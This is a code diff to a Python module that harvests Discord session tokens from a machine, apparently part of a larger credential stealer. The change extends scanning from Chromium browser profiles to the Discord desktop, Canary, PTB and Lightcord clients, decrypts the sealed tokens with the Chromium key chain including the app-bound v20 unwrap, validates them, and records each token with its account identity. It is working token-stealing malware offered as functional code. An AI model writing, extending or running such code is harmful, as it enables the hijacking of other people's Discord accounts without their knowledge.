@@ -1,9 +1,18 @@
-"""Browser session tokens from Chromium Local Storage.
+"""Discord session tokens from Local Storage.
 
 Discord keeps its token in ``Local Storage/leveldb`` as ``dQw4w9WgXcQ:`` followed by
 the base64 of a Chromium-sealed blob. The blob is ``v10``/``v20`` plus nonce,
 ciphertext and tag, so the same key chain ``chromium`` uses applies here, including
 the app-bound unwrap for ``v20``.
+
+Two places hold that store and they are different programs:
+
+- A browser profile, when Discord is used on the web. Found through
+  ``chromium_roots``, so every fork and every profile is covered.
+- The Discord desktop client itself, which is Electron. Same ``Local Storage``
+  layout, same ``Local State`` holding ``os_crypt``, no browser involved. A machine
+  where Discord has only ever been the installed app has no token anywhere else, so
+  walking browsers alone misses it entirely.
 
 The source repository matched the body with ``[^\\s]*``, which runs straight through
 the LevelDB record separator and swallows the next record into the token. The body is
@@ -21,9 +30,11 @@ from __future__ import annotations
 import base64
 import itertools
 import json
+import os
 import re
 import urllib.error
 import urllib.request
+from collections.abc import Iterator
 from pathlib import Path
 from typing import Any, Final
 
@@ -45,6 +56,26 @@ _MAX_FILE_BYTES: Final[int] = 16 * 1024 * 1024
 _MAX_HITS: Final[int] = 32
 
 _LEVELDB_SUFFIXES: Final[tuple[str, ...]] = (".log", ".ldb", ".sst")
+
+# Desktop clients. Electron keeps the browser's storage engine, so the token sits in
+# exactly the same place it would in Chrome; the only difference is that the "profile"
+# is the application data directory and ``Local State`` is the file inside it that
+# ``chromium.profile_keys`` reads first. The install name is not stable — the same
+# product appears as ``Discord`` and ``discord`` depending on installer version and
+# filesystem case — so both spellings are listed and a duplicate costs one stat.
+_DESKTOP: Final[tuple[tuple[str, str, str], ...]] = (
+    ("discord", "APPDATA", "discord"),
+    ("discord", "APPDATA", "Discord"),
+    ("discord_canary", "APPDATA", "discordcanary"),
+    ("discord_canary", "APPDATA", "DiscordCanary"),
+    ("discord_ptb", "APPDATA", "discordptb"),
+    ("discord_ptb", "APPDATA", "DiscordPTB"),
+    ("discord_development", "APPDATA", "discorddevelopment"),
+    ("discord_development", "APPDATA", "DiscordDevelopment"),
+    ("lightcord", "APPDATA", "Lightcord"),
+    ("discord", "LOCALAPPDATA", "Discord"),
+    ("discord", "LOCALAPPDATA", "discord"),
+)
 
 # Base64 only. Whitespace and control bytes terminate the match, which is what keeps
 # the body from running into the next LevelDB record.
@@ -163,10 +194,23 @@ def _validate(token: str, budget: list[int]) -> tuple[bool | None, dict[str, Any
     return result
 
 
-def run(out_dir: Path, cfg: Any) -> int:
-    """Collect and validate session tokens. Returns the number of unique tokens."""
-    budget = [_MAX_VALIDATIONS]
-    seen: dict[str, dict[str, Any]] = {}
+def _targets() -> Iterator[tuple[str, str, Path, Path]]:
+    """(label, profile name, key directory, leveldb directory) for every store.
+
+    The key directory is what ``chromium.profile_keys`` is handed. For a browser that
+    is the profile; for a desktop client it is the application data directory, whose
+    ``Local State`` sits beside ``Local Storage`` rather than above a profile child.
+    """
+    visited: set[str] = set()
+
+    def claim(directory: Path) -> bool:
+        # APPDATA appears with both spellings of the Discord directory and Windows
+        # resolves them to one folder, so the second sighting is the same store.
+        marker = os.path.normcase(os.path.abspath(str(directory)))
+        if marker in visited:
+            return False
+        visited.add(marker)
+        return True
 
     for root in chromium_roots():
         if not root.path.is_dir():
@@ -175,37 +219,53 @@ def run(out_dir: Path, cfg: Any) -> int:
 
         for profile in dirs[:_MAX_PROFILES]:
             leveldb = profile / "Local Storage" / "leveldb"
-            if not leveldb.is_dir():
+            if leveldb.is_dir() and claim(leveldb):
+                yield root.name, profile.name, profile, leveldb
+
+    for label, variable, relative in _DESKTOP:
+        base = os.environ.get(variable)
+        if not base:
+            continue
+        app = Path(base) / relative
+        leveldb = app / "Local Storage" / "leveldb"
+        if leveldb.is_dir() and claim(leveldb):
+            yield label, app.name, app, leveldb
+
+
+def run(out_dir: Path, cfg: Any) -> int:
+    """Collect and validate session tokens. Returns the number of unique tokens."""
+    budget = [_MAX_VALIDATIONS]
+    seen: dict[str, dict[str, Any]] = {}
+
+    for label, profile_name, key_dir, leveldb in _targets():
+        hits = _scan(leveldb)
+        if not hits:
+            continue
+
+        keys: chromium.Keys | None = None
+
+        for body, encrypted, source in hits:
+            if encrypted:
+                if keys is None:
+                    keys = chromium.profile_keys(key_dir)
+                token = _decrypt(body, keys)
+            else:
+                token = body.decode("ascii", "replace")
+
+            if not token or token in seen:
                 continue
 
-            hits = _scan(leveldb)
-            if not hits:
-                continue
-
-            keys: chromium.Keys | None = None
-
-            for body, encrypted, source in hits:
-                if encrypted:
-                    if keys is None:
-                        keys = chromium.profile_keys(profile)
-                    token = _decrypt(body, keys)
-                else:
-                    token = body.decode("ascii", "replace")
-
-                if not token or token in seen:
-                    continue
-
-                valid, identity = _validate(token, budget)
-                entry: dict[str, Any] = {
-                    "token": token,
-                    "browser": root.name,
-                    "profile": profile.name,
-                    "source": source,
-                    "encrypted": encrypted,
-                    "valid": valid,
-                }
-                entry.update(identity)
-                seen[token] = entry
+            valid, identity = _validate(token, budget)
+            entry: dict[str, Any] = {
+                "token": token,
+                "browser": label,
+                "profile": profile_name,
+                "source": source,
+                "encrypted": encrypted,
+                "valid": valid,
+            }
+            entry.update(identity)
+            seen[token] = entry
 
     if not seen:
         return 0
